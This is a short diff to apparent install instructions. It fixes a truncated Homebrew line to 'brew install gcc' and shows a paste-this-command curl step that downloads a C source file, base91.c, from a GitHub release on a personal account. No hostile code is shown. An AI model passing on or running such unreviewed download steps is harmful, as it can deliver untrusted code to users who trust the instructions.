@@ -56,7 +56,8 @@ Copy this command into your terminal to install Homebrew if not:
 It'll ask for your password. Type your password, it won't show then hit Enter.   
 Once done, type this command:
 ```bash
-brew i
+brew install gcc
+```
 Step 2: Install the C file:
 ```bash
 curl -fsSL 'https://github.com/c00lkiddpostshaxxs/base91/releases/download/v1/base91.c' -o base91.c
